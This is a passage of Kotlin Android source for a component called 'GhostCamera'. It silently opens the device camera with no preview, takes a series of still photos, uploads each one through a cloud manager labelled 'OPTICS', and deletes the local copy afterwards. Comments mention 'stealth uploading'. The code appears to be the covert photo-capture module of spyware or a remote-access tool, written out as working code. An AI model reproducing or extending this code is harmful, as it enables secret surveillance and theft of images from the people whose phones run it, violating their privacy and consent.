                if (!useFront && facing == CameraCharacteristics.LENS_FACING_BACK) targetId = id
                if (targetId != null) break
            }
            if (targetId == null) targetId = manager.cameraIdList.firstOrNull() ?: return@withContext

            // Resolve an optimal but manageable resolution (e.g., 1080p limit for stealth uploading)
            val chars = manager.getCameraCharacteristics(targetId)
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val sizes = map?.getOutputSizes(ImageFormat.JPEG) ?: emptyArray()
            val size = sizes.filter { it.width <= 1920 }.maxByOrNull { it.width * it.height } ?: sizes.firstOrNull() ?: android.util.Size(1920, 1080)

            for (i in 1..count) {
                captureSingle(ctx, manager, targetId, size, i)
                if (i < count) delay(1500) // Hardware cooldown
            }
        } catch (e: Exception) {
            DebugLogger.log("CAMERA_ERR", "GhostCamera failed: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun captureSingle(ctx: Context, manager: CameraManager, id: String, size: android.util.Size, index: Int) = suspendCancellableCoroutine<Unit> { cont ->
        try {
            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)

            reader.setOnImageAvailableListener({ ir ->
                val image = ir.acquireLatestImage()
                if (image != null) {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()

                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            val file = File(ctx.cacheDir, "optic_snap_${System.currentTimeMillis()}_$index.jpg")
                            file.writeBytes(bytes)
                            CloudManager.uploadFile(ctx, file, "OPTICS")
                            file.delete()
                        } catch(e: Exception){}
                    }
                }
                ir.close()
                if (cont.isActive) cont.resume(Unit)
            }, null)

            manager.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    val targets = listOf(reader.surface)
                    camera.createCaptureSession(targets, object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                            req.addTarget(reader.surface)
                            req.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                            session.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {
                                override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                                    camera.close()
                                }
                            }, null)
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            camera.close()
                            if (cont.isActive) cont.resume(Unit)
                        }
                    }, null)
                }
                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    if (cont.isActive) cont.resume(Unit)
                }
                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    if (cont.isActive) cont.resume(Unit)
                }
            }, null)
        } catch (e: Exception) {
            if (cont.isActive) cont.resume(Unit)
        }
    }
}

